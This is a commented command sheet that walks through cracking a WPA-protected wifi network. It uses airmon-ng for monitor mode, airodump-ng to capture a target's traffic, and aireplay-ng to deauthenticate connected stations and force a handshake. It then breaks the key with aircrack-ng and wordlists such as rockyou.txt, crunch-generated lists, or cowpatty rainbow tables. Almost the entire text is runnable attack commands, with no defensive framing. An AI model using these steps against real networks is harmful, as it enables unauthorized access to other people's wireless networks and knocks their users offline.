# Here are listed the steps needed to do the cracking of a wifi network 
# protected by WPA key using the tools: john the ripper, crunch and aircrack suite.

# become administrator
sudo su

#disable the network-manager
/etc/init.d/network-manager stop

# create a virtual network interface (associated with the wireless card) preset
#in monitor mode. Might need to disable the network card to go in monitor mode
airmon-ng start wlan0

#to enter monitor mode on any interface, but this will prevent normal operations:
(ifconfig nomewlan0 down; iwconfig nomewlan0 mode monitor)

#see what are the WPA networks near and the corresponding channel
airodump-ng mon0

#in our case, we assume the network to be cracked is called DIMAT-WPA,with bssid 00:11:22:33:44:55 and work on channel 2, so we restart focussing on this #channel
airodump-ng -c 2 --bssid 00:11:22:33:44:55 -w capture_file mon0

#Now we have to deauthenticate one station to capture the handshake. We deauthenticate all station with 2 packet
aireplay-ng -0 2 -a 00:11:22:33:44:55 mon0

#If we captured the handshake at the top right, in the terminal capture, will appear WPA handshake: 00:11:22:33:44:55
# Now we cam try to crack the WPA password with aircrack with the common used password list of john the ripper
aircrack-ng -w /usr/share/john/password.lst capture_file

#In kali linux we can use bigger wordlist called rockyou.txt
#Unzip the wordlist 
gzip -d /usr/share/wordlists/rockyou.txt.gz
#Crack the WPA password with aircrack and rockyou wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file

#If we want to generate a wordlist we can use crunch. The basic syntax for crunch looks like this:
    min = The minimum password length.
    max = The maximum password length.
    characterset = The character set to be used in generating the passwords.
    -t <pattern> = The specified pattern of the generated passwords.
    -o <outputfile> = This is the file you want your wordlist written to.
#Create a wordlist with with exact length 8 that start with poo and characterset all the lowercase character:
crunch 8 8 qwertyuiopasdfghjklzxcvbnm -t poo@@@@@ -o newWordlist

#Try to crack the password with the new wordlist
aircrack-ng -w newWordlist capture_file

#To speedup the cracking time we can use rainbow table with cowpatty.
cowpatty -d rainbow_table -r capture_file -s DIMAT-WPA
